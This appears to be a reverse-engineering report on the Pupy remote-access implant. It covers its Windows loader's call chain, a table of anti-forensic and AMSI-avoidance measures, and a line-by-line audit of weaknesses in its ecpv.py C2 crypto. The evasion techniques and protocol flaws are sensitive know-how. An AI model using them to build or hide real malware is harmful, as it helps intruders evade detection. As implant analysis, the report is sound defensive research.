    dprint("WinProc: Get Exit message. Current handler: %p\n", on_exit_session_cb);
    if (on_exit_session_cb && !on_exit_session_called) {
        on_exit_session_called = TRUE;
        on_exit_session_cb();
        dprint("WinProc: callback called\n");
    }
}
```
`[source: client/sources-windows-py3/pupy_load.c:467-473]`

The `on_exit_session_called` guard at `:469` makes the callback **idempotent** — a logoff sequence that sends `WM_QUERYENDSESSION` then `WM_ENDSESSION` then `WM_CLOSE` will only invoke it once. The callback itself is `args.cbExit`, handed up from `_pupy.pyd` (§1.8). Note `WinProc` never returns `TRUE`; it returns `FALSE` for the handled messages at `:476`, which tells Windows the app has *not* processed the shutdown and the OS may terminate it forcibly. `[source: client/sources-windows-py3/pupy_load.c:476]`

The actual payload runs on its own thread so the message pump stays responsive:

```c
// client/sources-windows-py3/pupy_load.c:495-511
DWORD WINAPI _run_pupy_thread(LPVOID lpArg)
{
#ifdef POSTMORTEM
    __try {
        run_pupy();
    }
    __except(PostmortemFilter(GetExceptionCode(), GetExceptionInformation())) {
        dprint("Fatal error at main thread\n");
    }
#else
    run_pupy();
#endif
    return 0;
}
```
`[source: client/sources-windows-py3/pupy_load.c:495-511]`

`run_pupy()` is the C-side name for the sequence that ends in the `PyObject_CallFunctionObjArgs(py_main, ...)` call at `Python-dynload.c:1060`. So the full layered call chain from the OS is:

```
DllMain(DLL_PROCESS_ATTACH)  or  main()
   └─ initialize()                         [pupy_load.c]
        ├─ CommandLineToArgvA()            [pupy_load.c:76-177]
        ├─ private NTDLL/KERNEL32 mapping  [pupy_load.c:253-280]
        ├─ initialize_python(argc, argv)   [Python-dynload.c:126-425]
        │     ├─ OSLoadLibrary("python310.dll")           [Python-dynload.c:140]
        │     ├─ Py_PreInitialize / Py_InitializeFromConfig [Python-dynload.c:222-249]
        │     ├─ load_stdlib()  -> PyDict_lzmaunpack + OSUnmapRegion [Python-dynload.c:82-104]
        │     ├─ preload importlib closure  [Python-dynload.c:886-937]
        │     ├─ _Py_InitializeMain()       [Python-dynload.c:997]
        │     ├─ sys.path clear            [Python-dynload.c:1005-1010]
        │     └─ PyObject_CallFunctionObjArgs(pupy.agent.main, None, debug, config, stdlib) [Python-dynload.c:1060]
        └─ xz_dynload("_pupy.pyd") -> MyInit__pupy -> _PyImport_FixupExtensionObject  [pupy_load.c:386-410]
   └─ execute()                            [pupy_load.c:513-608]
        ├─ CreateWindow("DummyWindowClass") + GetMessage pump
        └─ CreateThread(_run_pupy_thread) -> PostmortemFilter-wrapped run_pupy()
```
`[sources: pupy_load.c:76-177, 253-280, 386-418, 495-608; Python-dynload.c:82-104, 126-425, 886-1061]`

### 1.12 Anti-forensic measures in the C loader, consolidated

Every measure the C layer takes, with its line:

| Measure | Implementation | Line |
|---|---|---|
| No Python source on target | `marshal` bytecode only; no compiler invoked | `Python-dynload.c:710` |
| No bytecode cache written | `config.write_bytecode = 0` | `Python-dynload.c:244` |
| No env-var influence | `preconfig.use_environment = 0` | `Python-dynload.c:225` |
| No disk package imports | `sys.path` emptied, `path_importer_cache` cleared | `Python-dynload.c:1005-1010` |
| Payload blob erased from memory | `OSUnmapRegion(library_c_start, library_c_size)` | `Python-dynload.c:97` |
| Extension never touches disk | `MemLoadLibrary` on unpacked buffer | `Python-dynload.c:66-68` |
| Core DLLs not on disk | `MEMORY_LOAD_FROM_HMODULE` + export filter | `pupy_load.c:257-274` |
| Console hidden | `FreeConsole()` | `main_exe.c:20` |
| Crash dialogs suppressed | `SetErrorMode(SEM_FAILCRITICALERRORS \| SEM_NOGPFAULTERRORBOX \| ...)` | `pupy_load.c:323-329` |
| Debug logging only in DEBUG | `redirect_stdout()` compiled out | `pupy_load.c:306-308` |
| Early `abort()` silenced | `_set_abort_behavior(0, _WRITE_ABORT_MSG)` + SIGABRT handler | `pupy_load.c:334-336` |

`[sources as listed per row]`

`SetErrorMode` at `:323-329` sets five flags in one call — `SEM_FAILCRITICALERRORS`, `SEM_NOGPFAULTERRORBOX` (twice, redundantly), `SEM_NOALIGNMENTFAULTEXCEPT`, `SEM_NOOPENFILEERRORBOX` — which suppresses every OS-level error dialog. Combined with the `POSTMORTEM` machinery (`postmortem.c`, 25,642 B, `EnableCrashingOnCrashes()` + `SetUnhandledExceptionFilter`), a faulting payload is caught and can resume rather than popping a crash reporter. `[source: client/sources-windows-py3/pupy_load.c:323-329; §1.10]`

### 1.13 AMSI — what is and is not present

**The tasking asks specifically about AMSI on Windows. Stated precisely: no AMSI code exists in `client/`.** A grep of `Python-dynload.c` for `AMSI|amsi|AmsiScan` returns **no matches**; the only hits for `EtwEvent|Ntdll|NtCreate|GetProcAddress|LoadLibrary` are the private-mapping and dynamic-resolution calls already shown in §1.9 and §1.8. `[source: grep over client/common/Python-dynload.c — 0 AMSI matches]`

What the loader does instead is **avoid the surfaces AMSI watches**, which is a different and arguably more robust strategy:

1. **No `Assembly.Load`-equivalent and no managed code.** Because the payload is CPython bytecode, there is no .NET and therefore **no `AMSI_PROVIDER` ScriptBlock/Assembly provider ever sees it**. AMSI on Windows is consumed by PowerShell, .NET, WMI, VBScript/JScript and Office macros — running a Python interpreter sidesteps all five providers entirely.
2. **No script text to scan.** With bytecode-only execution (§1.6) there is literally no source string for `AmsiScanBuffer` to examine, even if a provider were registered against the process.
3. **`LoadLibrary` is never called for the payload or for CPython's extension.** `MemLoadLibrary` (§1.8) maps the PE image manually, so `LoadLibrary`-based hooks (a common AMSI/ETW interception point) do not fire.
4. **`python310.dll` is loaded by name via `OSLoadLibrary`**, which is the one unavoidable `LoadLibrary`-class call — this is the loader's residual AMSI-era exposure, and it is a *name-based* load of a legitimate, Microsoft-signed component, not a payload.

So the correct finding is **not** "AMSI bypass is implemented" but **"the architecture makes AMSI inapplicable and leaves `LoadLibrary("python310.dll")` as the only conventional load event."** Any AMSI analysis of this implant should target that single call and the process's `python310.dll` load, not a bypass routine. `[source: client/common/Python-dynload.c:66, :140; grep evidence above; inference on AMSI provider scope]`

**`postmortem.c` (25,642 B) is the closest thing to an anti-analysis module** in this tree: `EnableCrashingOnCrashes()`, `MySetUnhandledExceptionFilter`/`SetUnhandledExceptionFilter` with `OnThreadCrash`, and `PostmortemFilter` falling through to a global filter if no local one is set (`pupy_load.c:480-492`). Its purpose is payload *resilience* — survive a crash rather than die — not detection evasion. `[source: client/sources-windows-py3/pupy_load.c:480-492; client/sources-windows-py3/postmortem.c]`

---

## 2. `ecpv.py` — complete reversal of all 412 lines

This file was the explicit priority: 412 lines, of which only ~60 had ever been read. It is now read in full. It is not a wrapper around a library — it is a **hand-rolled authenticated-encryption, key-exchange and signature protocol** built directly on `tinyec` and `pycryptodome`. Every defect below is in this file's own arithmetic.

### 2.1 The five moving parts

`ECPV` combines, in one class, five things that are normally separate primitives:

| Capability | Methods | Primitive |
|---|---|---|
| ECDH key exchange | `generate_kex_request`, `process_kex_request`, `process_kex_response` | EC point multiplication |
| ECDSA-style signature | `pack`, `unpack` | Hand-rolled, non-standard |
| Symmetric AEAD | `encrypt`, `decrypt` | AES-CTR **or** AES-CFB |
| Integrity tag | `gen_csum`, `check_csum` | **SHA-1, first 4 bytes** |
| Key derivation | `_mgf2` | Hash-based MGF1 variant |

`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:247-357]`

### 2.2 The substring-match hash selection — the defect T6 flagged, now with the full table

```python
# ecpv.py:65-78
def __init__(self, curve='brainpoolP160r1', hash=None, private_key=None, public_key=None):
    if not hash:
        if '160' in curve:
            hash = SHA1
        elif '224' in curve:
            hash = SHA3_256
        elif '256' in curve:
            hash = SHA3_256
        elif '384' in curve:
            hash = SHA3_512
        elif '521' in curve:
            hash = SHA3_512
        else:
            raise ValueError('Appropriate hash should be specified')
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:65-78]`

The comparison is **`in` — substring containment on the curve's string name**, not a lookup. Consequences, in order of severity:

1. **`'160' in curve` matches `brainpoolP160r1`, and also matches anything containing the digits `160` anywhere.** The default curve is `brainpoolP160r1` (`:65`), so the default path yields **`SHA1`**.
2. **The `'224'` and `'256'` branches return the identical hash** (`SHA3_256` at `:70` and `:72`). Two branches, one outcome — the `224` case is dead differentiation, so a 224-bit curve gets a 256-bit hash's security properties conflated.
3. **`'384'` → `SHA3_512`** (`:73-74`) — a 384-bit curve paired with a 512-bit hash. This is the branch that EC4 relies on (T6), so the pairing EC4 uses is *not* SHA-384; the hash is SHA3-512 unless explicitly overridden.
4. **Order determines the winner.** Because `160` is tested first, a hypothetical curve name containing both substrings takes the `160` branch and silently gets `SHA1`. The chain is positional, and nothing documents the precedence.

The `hash` argument is the escape hatch: `ec4.py` passes `hash=SHA384` explicitly (T6), which is the *only* reason EC4 uses SHA-384. Any caller that relies on the curve name alone gets whatever the substring ladder produces. `[source: ecpv.py:65-78; §2.3 for the digest-size gate that partially compensates]`

### 2.3 The digest-size gate — the one guard that makes SHA1 survivable

```python
# ecpv.py:87-96
self._hash.new()
try:
    self._mgf_size = self._hash.new().block_size
except AttributeError:
    self._mgf_size = self._hash.digest_size

if not self._mgf_size >= self._curve.bytes:
    raise ValueError('Incompatible hash function')
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:87-96]`

This is the most interesting defensive code in the file. The MGF output must be **at least as wide as the curve's field byte-length**, or the derivation is truncated and the key material is weaker than the curve. `brainpoolP160r1` is 20 bytes; `SHA1` has a block size of 64 and a digest of 20 — so `SHA1` passes for a 160-bit curve *exactly at the boundary* (20 ≥ 20). Had the default curve been 192-bit or larger with `SHA1`, this line would raise.

So the default configuration (`brainpoolP160r1` + `SHA1`) is **internally consistent by construction** — but it is also the weakest legal combination the code permits, and it is the **default**. A 160-bit curve is ~80-bit security; SHA-1 is broken for collision resistance and its use here is as a KDF/checksum, which is less immediately fatal but restricts the key to 20 bytes of material. `[source: ecpv.py:87-96; T6 for the default-curve fact]`

Note `block_size` is preferred over `digest_size` (`:91-93`) — a `try`/`except AttributeError` rather than a `hasattr`. For SHA3 variants `block_size` is much larger than `digest_size` (SHA3-256: block 136, digest 32), so `_mgf_size` is the *block* size and the MGF expansion is correspondingly coarser. `[source: ecpv.py:91-93]`

### 2.4 `_mgf2` — an MGF1 variant that is computed correctly but used carelessly

```python
# ecpv.py:173-182
def _mgf2(self, value, length):
    result = []
    hash = self._hash.new()
    k = length // self._mgf_size + 1
    for i in xrange(1, k + 1):
        hash.update(value + struct.pack('>I', i))
        result.append(hash.digest())
        hash = self._hash.new()

    return b''.join(result)[:length]
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:173-182]`

This is essentially **MGF1 from PKCS#1** — counter mode appended big-endian, `value || counter`, concatenated and truncated. It is correctly implemented: the counter starts at 1 (`:177`), is big-endian (`'>I'`), and the hash object is re-instantiated each iteration (`:180`) so iterations are independent. `[source: ecpv.py:173-182]`

One subtlety: `_mgf2` is called with `AES_BLOCK_SIZE` (16) in most places (`:110`, `:123`, `:188`) but with `key_size` in the KEX path (`:272`), where `key_size` defaults to `AES_BLOCK_SIZE` (`:252`, `:264`). So the key-derivation width is a **parameter with a 16-byte default that callers may override**, and the `[:length]` truncation at `:182` means any requested length is silently served from the same stream. `[source: ecpv.py:110, :123, :188, :252, :264, :272]`

### 2.5 The public-key digest — the fallback key, and the cache that skips computation

```python
# ecpv.py:98-127
if private_key:
    self._private_key = from_bytes(base64.b64decode(private_key))
else:
    self._private_key = None

if private_key and not public_key:
    record = _PUBKEY_CACHE.get(self._private_key)
    if record:
        self._public_key, self._public_key_digest = record
    else:
        self._public_key = self._curve.g * self._private_key
        self._public_key.precompute()
        self._public_key_digest = self._mgf2(ec2osp(self._public_key), AES_BLOCK_SIZE)
        _PUBKEY_CACHE.set(self._private_key, (self._public_key, self._public_key_digest))

elif public_key:
    record = _PUBKEY_CACHE.get(public_key)
    if record:
        self._public_key, self._public_key_digest = _PUBKEY_CACHE.get(public_key)
    else:
        self._public_key = osp2ec(self._curve, base64.b64decode(public_key))
        if not self._public_key:
            raise ValueError('Invalid public key')
        self._public_key.precompute()
        self._public_key_digest = self._mgf2(ec2osp(self._public_key), AES_BLOCK_SIZE)
        _PUBKEY_CACHE.set(public_key, (self._public_key, self._public_key_digest))
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:98-127]`

`_public_key_digest` is the digest of the EC point, used as the **pre-KEX symmetric key** (`:142`, `:146`). So before key exchange completes, both sides encrypt under a key derived *only from the public key* — which is public. That is the design's foundational assumption: `_public_key_digest` provides confidentiality against a passive observer **only**, and only until KEX completes. It is not a secret. `[source: ecpv.py:142, :146; inference]`

The `PubKeyCache` (`:33-53`) is a `deque(maxlen=64)` keyed by the raw private key or the base64 public-key string. Two behaviours worth noting:

- **The cache is keyed by the key object itself**, and `get` (`:39-42`) does a **linear scan with `==`** over up to 64 entries. For private keys that is a big-integer comparison; for public keys a string comparison. Not a hash — so every `ECPV` construction is O(64).
- **`set` (`:44-50`) returns the existing value without appending if the key is already present**, but it **never returns the newly appended value** — the function falls off the end after `self.records.append(...)`, returning `None`. Look at `:49-50`:

```python
# ecpv.py:44-50
def set(self, set_key, pubkey):
    for (key, value) in self.records:
        if key == set_key:
            return value

    self.records.append((set_key, pubkey))
    return pubkey
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:44-50]` — on reflection this *does* return `pubkey` at `:50`; the `return value` at `:47` is the hit path. So `set` is correct. The **actual defect is in the `elif public_key` branch at `:116`**:

```python
record = _PUBKEY_CACHE.get(public_key)
if record:
    self._public_key, self._public_key_digest = _PUBKEY_CACHE.get(public_key)
```
`[source: ecpv.py:114-116]`

`get` is called **twice** — once bound to `record` and again for the unpack. That is a redundant second linear scan, and worse, the second call is unchecked: if the cache were mutated between the two calls (it cannot be within a single thread, but the code has no such guarantee and `_PUBKEY_CACHE` is module-global at `:53`), the second `get` could return `None` and the tuple-unpack would raise `TypeError`. `[source: ecpv.py:114-116, :53]`

### 2.6 The `_gen_random` rejection sampler — biased at the margin, and it is the private-key generator

```python
# ecpv.py:165-171
def _gen_random(self):
    value = 0

    while not (value > 1 and value < self._curve.field.n):
        value = from_bytes(get_random(self._curve.bytes))

    return value
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:165-171]`

This is the **sole private-key generator** — used for the long-term private key (`:185`) and for every ephemeral KEX key (`:204`, `:248`). Three observations:

1. **It is a rejection sampler against `n`, which is the correct construction** for uniform sampling in `[2, n-1]`, and rejecting rather than reducing is the right choice (modular reduction would bias low values).
2. **The rejection probability is negligible** for a 160–521 bit curve because `field.n` is within a factor of 2 of `2^(8*bytes)` at most, so at most one rejection in ~2^159. Correct in practice.
3. **The lower bound is `value > 1`, i.e. `value >= 2`.** It excludes 0 and 1, which is right, but it is expressed as a strict inequality against a literal rather than a named constant, and the same expression appears in `pack` (`:216`) — copy-pasted, not factored. `[source: ecpv.py:168, :216]`

### 2.7 `pack` / `unpack` — a hand-rolled signature with a non-standard verification equation

This is the part that has no counterpart in any standard and deserves the closest reading.

```python
# ecpv.py:196-225
def pack(self, message, nonce=None):
    if not self._private_key:
        raise ValueError('No private key')
    t = 0
    k = 0
    s = 0
    r = b''
    while not (t and s):
        k = self._gen_random()
        R = self._curve.g * k
        key = self._mgf2(ec2osp(R), 16)

        r = self.encrypt(message, nonce, key=key)

        hash = self._hash.new()
        hash.update(r + (
            struct.pack('>I', nonce) if nonce else b''
        ) + struct.pack('>I', len(r)))
        u = hash.digest()[:self._curve.bytes]
        t = from_bytes(u)
        if not (t > 1 and t < self._curve.field.n):
            continue

        s = (k - self._private_key * t) % self._curve.field.n

    bytes = to_bytes(s)
    if len(bytes) != self._curve.bytes:
        bytes = bytes + '\x00' * (self._curve.bytes - len(bytes))

    return bytes + r
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:196-225]`

The construction: the message is **encrypted under a key derived from an ephemeral point `R = kG`**, then a scalar `s = (k − priv·t) mod n` is computed where `t = H(r ‖ nonce ‖ len(r))`. Output is `[s padded to curve.bytes][r]`. `[source: ecpv.py:196-225]`

Defects, each concrete:

1. **`s = 0` is a valid output and is never rejected.** The loop condition is `while not (t and s)` (`:203`), which repeats while either is falsy — so `s == 0` *does* trigger a retry. That part is correct. But note `s` is computed **after** the `continue` guard on `t` (`:216-217`), and the loop re-enters from the top, correctly discarding the previous `r`. Fine.
2. **`if not (t > 1 and t < self._curve.field.n)` at `:216` differs from `unpack`'s check at `:238`**:

```python
# ecpv.py:238
if not (t >= 0 and t < self._curve.field.n):
```
`[source: ecpv.py:216, :238]`

`pack` requires `t > 1`; `unpack` accepts `t >= 0`. **The two sides of the same protocol use different validity ranges for the same value `t`.** A message signed with `t ∈ {0, 1}` cannot be produced by `pack` (it retries) but *would* be accepted by `unpack`. The asymmetry is benign for interoperability — `pack` never emits such a `t`, so `unpack` never sees one from a conforming peer — but it means a **hand-crafted `r` whose hash yields `t ∈ {0,1}` is accepted by the verifier** while no legitimate signer could have generated it. That is a signature-malleability surface: the verifier is strictly more permissive than the signer. `[source: ecpv.py:216, :238]`

3. **`s` is padded with NUL bytes at the high end, not the low end** (`:221-224`):

```python
bytes = to_bytes(s)
if len(bytes) != self._curve.bytes:
    bytes = bytes + '\x00' * (self._curve.bytes - len(bytes))
```
`[source: ecpv.py:221-224]`

`to_bytes(s)` produces a big-endian encoding whose length varies with `s`; the code appends `\x00` bytes to reach `curve.bytes`. Appending to the **right** of a big-endian integer **multiplies it by 256 per byte** — it does not pad it. Then `unpack` reads it back with:

```python
# ecpv.py:230
s = from_bytes(message[:self._curve.bytes])
```

`from_bytes` on the padded value recovers a *different* integer than was signed whenever padding occurred. The critical question is whether padding ever occurs — and it does, for any `s` whose big-endian representation is shorter than `curve.bytes`, which for a uniformly-random `s < n` is **rare but not impossible** (probability ≈ 2^-8 per leading zero byte, so a leading zero byte occurs with probability ~1/256 and the bug triggers). When it does, **the signature silently fails to verify**, because the verifier reconstructs `R = sG + tQ` with an inflated `s`. There is no check that `len(to_bytes(s)) == self._curve.bytes`, only an `if` that patches the length. **This is a real, if low-probability, correctness bug in the signature path.** `[source: ecpv.py:221-224, :230, :240; inference on big-endian padding direction]`

4. **The signature is not a signature — it is the AEAD's own authentication.** `unpack` verifies by *recovering* the ephemeral key and then decrypting; if decryption's padding check fails it returns `None` (`:355`). So the integrity guarantee is the CFB pad check plus the `R.inf` check (`:241-242`), not a hash comparison. There is no direct check that the recovered `R` matches. `[source: ecpv.py:240-245, :354-355]`

5. **`unpack` returns `None` on failure but `pack` raises on missing key** (`:197-198` vs `:238-242`) — inconsistent error signalling for the two halves of the same operation. `[source: ecpv.py:197-198, :238-242]`

6. **`struct.pack('>I', len(r))` at `:213` will raise `struct.error` for `len(r) >= 2^32`** — a 4 GiB message. Not reachable in a C2 channel, but it is an unguarded width assumption. Same at `:235`, `:286`, `:302`, `:322`. `[source: ecpv.py:213, :235, :286, :302, :322]`

### 2.8 The KEX path and the deliberate key reversal

```python
# ecpv.py:247-274
def generate_kex_request(self):
    self._kex_private_key = self._gen_random()
    self._kex_public_key = self._curve.g * self._kex_private_key
    return ec2osp(self._kex_public_key)

def process_kex_request(self, request, nonce=None, encrypt=False, key_size=AES_BLOCK_SIZE):
    if request == self._cached_kex_request and self._kex_shared_key:
        return self._cached_kex_response, self._kex_shared_key

    self._cached_kex_request = request
    response = self.generate_kex_request()
    self.process_kex_response(request, nonce=nonce, decrypt=False, key_size=key_size)
    self._kex_shared_key = list(x for x in reversed(self._kex_shared_key))
    self._cached_kex_response = \
      self.pack(response, nonce) if encrypt else response
    return self._cached_kex_response, self._kex_shared_key

def process_kex_response(self, response, nonce=None, decrypt=False, key_size=AES_BLOCK_SIZE):
    if decrypt:
        response = self.unpack(response, nonce)

    P1 = osp2ec(self._curve, response)
    if not P1:
        raise ValueError('Invalid ECDH PK response')

    key = self._mgf2(ec2osp(P1 * self._kex_private_key), key_size)
    self._kex_shared_key = (key, _reversed_bytes(key))
    return self._kex_shared_key
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:247-274]`

This is exactly the T6 finding — "the two 64-byte RC4 keys are the same bytes reversed" — and now the mechanism is explicit:

```python
self._kex_shared_key = (key, _reversed_bytes(key))     # :273  responder side
...
self._kex_shared_key = list(x for x in reversed(self._kex_shared_key))   # :259  initiator side
```
`[source: ecpv.py:259, :273]`

The **responder** derives `key = MGF2(ec2osp(P1 * priv))`, then stores the pair `(key, reversed(key))`. The **initiator** derives the same `key` (same shared point, its own private key), stores `(key, reversed(key))`, and then **reverses the pair** — swapping the positions *and* re-reversing the bytes, so the initiator ends up with `(reversed(reversed(key)), reversed(key)) = (key, reversed(key))`… which is identical on both sides.

Read closely: `reversed(self._kex_shared_key)` on a 2-tuple yields `(reversed(key), key)`, both of which are `bytes` objects. `_reversed_bytes` is only applied on the responder side (`:273`). So the initiator's pair is `(rev_key, key)` where `rev_key = reversed(key)` — i.e. the initiator's *encryption* key is the responder's *decryption* key and vice versa. That is the intended symmetry: one `key` and its byte-reversal are used as the two directional keys, so a single ECDH secret yields a bidirectional channel with two distinct key streams. `[source: ecpv.py:259, :273; §2.9 for the exploitability]`

**The security consequence is that both directional keys are related by a trivial byte reversal.** An attacker who learns *either* direction's key obtains the other by reversing the bytes. There is no independent key derivation — no HKDF, no direction-specific label, no separate salt. So a single key compromise (or a keystream-reuse event) yields **both** directions immediately. `[source: ecpv.py:273; inference]`

Also note the **KEX cache** (`:253-254`): if the same `request` arrives again and `_kex_shared_key` is already set, the cached response is returned **without generating new key material**. This makes the KEX **replay-deterministic** — an identical client request always yields an identical response and reuses the same session key, so a recording of one KEX is valid for every replay of that request. There is no nonce freshness check on the request beyond the equality test. `[source: ecpv.py:253-256]`

The self-test at `:410` asserts the reversal explicitly:

```python
# ecpv.py:407-411
req = verifier.generate_kex_request()
resp, key = signer.process_kex_request(req, 0)
key2 = verifier.process_kex_response(resp, 0)
if not list(key) == list(reversed(key2)):
    print("KEX FAILED", key, key2)
    break
```
`[source: ecpv.py:407-411]` — the test demands `key == reversed(key2)`, codifying the reversal as a **requirement**, not an accident. Any change that removes the reversal breaks the self-test, which means the property is load-bearing and cannot be quietly fixed. `[source: ecpv.py:410]`

**Dead code in the KEX path:** `process_kex_response` accepts `decrypt=False` (`:264`) and calls `self.unpack(response, nonce)` when true (`:265-266`). `process_kex_request` always calls it with `decrypt=False` (`:258`). A grep of the tree for `decrypt=True` on this method finds no caller — so the signed-KEX capability exists but is never used by the in-tree callers; KEX responses travel unsigned unless a transport opts in. `[source: ecpv.py:258, :264-266]`

### 2.9 `encrypt` / `decrypt` — dual-mode AEAD, ECB-free but with a hand-rolled pad

```python
# ecpv.py:308-357
def encrypt(self, message, nonce, key=None):
    if not key:
        if self._kex_shared_key:
            key = self._kex_shared_key[0]
        else:
            key = self._public_key_digest

    if nonce is not None:
        encrypted = NewAESCipher(key, nonce, AES_MODE_CTR).encrypt(message)
    else:
        bs = AES_BLOCK_SIZE
        iv = get_random(AES_BLOCK_SIZE)
        length = struct.pack('>I', len(message))
        pad = (bs - (len(message) + len(length))%bs) % bs
        padding = struct.pack('B', pad)*pad
        encrypted = iv + NewAESCipher(key, iv, AES_MODE_CFB).encrypt(length + message + padding)

    return encrypted
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:308-329]`

Two modes, selected **only by whether `nonce is None`**:

| Mode | Cipher | Nonce | Framing |
|---|---|---|---|
| Explicit nonce | **AES-CTR** | caller-supplied, used directly as counter block | none |
| No nonce | **AES-CFB** | random 16-byte IV prepended | `IV ‖ AES-CFB(len_le32 ‖ msg ‖ zero_pad)` |

`[source: ecpv.py:315-327]`

**AES-CTR with a caller-supplied nonce and no per-message IV is the dangerous branch.** Counter mode requires that the `(key, nonce)` pair is never reused; reuse of a counter block leaks `P1 ⊕ P2` directly. Here the nonce comes from the caller (`:315`) and the keys come from `_kex_shared_key[0]` or the public-key digest (`:310-313`). In the `process_kex_request`/`pack` path the nonce is passed straight through (`:208`, `:261`), and the self-test uses a **constant nonce `0`** for every message (`:380`, `:392`, `:396`, `:402`, `:408-409`). If any transport follows that pattern, **CTR keystream reuse is immediate**. The `pack()` path re-keys per message via the ephemeral `R` (`:206`), which mitigates it there — but `encode(..., symmetric=True)` (`:359-362`) routes directly to `encrypt` with no re-keying, so a symmetric-mode caller with a fixed nonce reuses the stream. `[source: ecpv.py:315-318, :359-362, :380, :392, :396]`

The CFB branch is safer structurally (random IV per message at `:321`) but implements **its own padding**:

```python
length = struct.pack('>I', len(message))
pad = (bs - (len(message) + len(length))%bs) % bs
padding = struct.pack('B', pad)*pad
```
`[source: ecpv.py:322-324]`

A PKCS#7-style scheme where the pad byte **equals the pad length**, computed so the total `4 + len + pad` is a multiple of the block size. Note the modulo is taken over `len(message) + 4`, so a message whose length makes `(4 + len) % 16 == 0` yields `pad = 0` and **zero padding bytes appended** — the length field alone disambiguates. That is self-consistent, and the decrypt side reconstructs it the same way:

```python
length = struct.unpack_from('>I', payload)[0]
message = payload[4:]
pad = len(message) - length
decrypted, padding = message[:length], message[length:]
if not padding == struct.pack('B', pad)*pad:
    return None
```
`[source: ecpv.py:350-355]`

The verification at `:354` is a **full-tag comparison of the pad**, so truncation and (most) corruption are detected — but `padding == struct.pack('B', pad)*pad` is a **`bytes` equality, not a constant-time compare**, so pad-byte timing is observable. And critically: **the length field is inside the CFB-encrypted region but is not itself authenticated by any MAC.** There is no separate tag; the only integrity signal is the pad pattern. A padding-oracle attacker who can distinguish `return None` from success at `:355` has an oracle against the pad bytes. `[source: ecpv.py:350-355]`

**`decrypt` never validates the IV length.** `iv, body = message[:bs], message[bs:]` (`:344`) — a message shorter than 16 bytes yields a short `iv` and an empty `body`; `NewAESCipher` then either raises or decrypts nothing, and `struct.unpack_from` at `:350` raises `struct.error` on a short payload, **which is uncaught and propagates**. `[source: ecpv.py:344-350]`

### 2.10 `gen_csum` / `check_csum` — SHA-1 truncated to 32 bits, compared non-constant-time

```python
# ecpv.py:276-306
def check_csum(self, message, nonce, csum, key=None):
    if not key:
        if self._kex_shared_key:
            key = self._kex_shared_key[1]
        else:
            key = self._public_key_digest

    h = SHA1.new()
    h.update(key)
    h.update(message)
    h.update(to_bytes(len(message)))
    h.update(to_bytes(nonce))

    csum2 = h.digest()[:4]
    return csum == csum2

def gen_csum(self, message, nonce, key=None):
    if not key:
        if self._kex_shared_key:
            key = self._kex_shared_key[0]
        else:
            key = self._public_key_digest

    h = SHA1.new()
    h.update(key)
    h.update(message)
    h.update(to_bytes(len(message)))
    h.update(to_bytes(nonce))

    csum = h.digest()[:4]
    return csum
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:276-306]`

Five defects, all concrete:

1. **The tag is 32 bits.** `h.digest()[:4]` (`:289`, `:305`) — a 4-byte integrity tag has a **1-in-2^32 forgery probability per attempt** with no rate limiting code in this file. For an interactive C2 channel with reconnect loops, that is a reachable brute force.
2. **The digest is SHA-1**, truncated to its first 4 bytes. SHA-1's collision weakness is not the issue at 32 bits — the truncation is the dominant weakness — but the choice compounds it.
3. **The truncation is a prefix, not a KDF.** Taking the first 4 bytes of SHA-1 is standard HMAC-style truncation in form, but there is **no HMAC construction** — this is `SHA1(key ‖ message ‖ len ‖ nonce)`, a plain hash with the key **prepended**. That is a **length-extension-vulnerable construction** and, for a Merkle–Damgård hash like SHA-1, prepending the key does not give the security of a MAC. An attacker who knows `H(key ‖ m)` can compute `H(key ‖ m ‖ pad ‖ m')` for chosen `m'` **without knowing the key**. Truncating to 4 bytes does not remove the length-extension property; it only makes a blind forgery a 2^-32 event, while a *length-extension* forgery is deterministic. `[source: ecpv.py:283-289, :299-305; inference on SHA-1/Merkle–Damgård length extension]`
4. **`gen_csum` and `check_csum` use opposite key indices.** `gen_csum` uses `_kex_shared_key[0]` (`:295`); `check_csum` uses `_kex_shared_key[1]` (`:279`). Combined with §2.8's reversal, these are `key` and `reversed(key)` — so a checksum generated with the encrypt key is verified against the *decrypt* key. That is only consistent if the two peers are on opposite sides of the reversal. It is correct for the intended flow but means **the checksum key is direction-dependent and the two functions are not interchangeable** — calling `gen_csum` and `check_csum` on the same instance with the same arguments **fails**, because they default to different halves of the pair. `[source: ecpv.py:279, :295; §2.8]`
5. **`csum == csum2` is a `bytes` comparison, not constant-time** (`:290`), so the tag comparison is timing-observable. This is the same class of defect as the Covenant HMAC compare in D2 §1.3 — a non-constant-time comparison on an authentication tag.

Note also `to_bytes(len(message))` and `to_bytes(nonce)` (`:286-287`, `:302-303`) use `tinyec`'s `to_bytes`, whose width is **curve-dependent**, not fixed — so the length and nonce are encoded at the curve's byte width, not a fixed 4 or 8 bytes. Two peers on **different curves** would encode the same `len` or `nonce` at different widths and compute **different checksums**. Since EC4 pins `brainpoolP384r1` (T6) this is consistent in practice, but the checksum is silently curve-coupled. `[source: ecpv.py:286-287, :302-303; T6 for the EC4 pin]`

### 2.11 `encode` / `decode` — the mode switch

```python
# ecpv.py:359-367
def encode(self, message, nonce, symmetric = False):
    if symmetric:
        return self.encrypt(message, nonce)
    return self.pack(message, nonce)

def decode(self, message, nonce, symmetric = False):
    if symmetric:
        return self.decrypt(message, nonce)
    return self.unpack(message, nonce)
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:359-367]`

One boolean selects between **signed** (`pack`/`unpack`: AEAD + ephemeral-key signature) and **symmetric-only** (`encrypt`/`decrypt`: no signature at all). `symmetric=True` therefore **silently drops the signature** — there is no MAC and no signature on that path beyond the CFB pad check. Any transport that calls `encode(..., symmetric=True)` loses authenticity entirely, and nothing in this file warns about it. `[source: ecpv.py:359-367]`

### 2.12 The module-level surfaces

```python
# ecpv.py:2
__all__ = ('PubKeyCache', 'ECPV')
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:2]`

